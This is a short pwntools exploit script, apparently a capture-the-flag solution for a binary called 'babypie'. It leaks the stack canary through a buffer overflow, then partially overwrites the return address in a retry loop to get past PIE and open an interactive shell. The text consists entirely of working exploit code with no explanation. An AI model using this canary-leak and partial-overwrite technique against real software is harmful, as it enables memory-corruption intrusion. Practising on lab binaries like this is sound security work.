#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *
#  context.log_level = "debug"
context.terminal = ["deepin-terminal", "-x", "sh", "-c"]

while True:
    try:
        io = process("./babypie", timeout = 1)
        
        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8 + 1))
        io.recvuntil('a' * (0x30 - 0x8 + 1))
        canary = '\0' + io.recvn(7)
        success(canary.encode('hex'))
        
        #  gdb.attach(io)
        io.sendafter(":\n", 'a' * (0x30 - 0x8) + canary + 'bbbbbbbb' + '\x3E\x0A')
        
        io.interactive()
    except Exception as e:
        io.close()
        print e
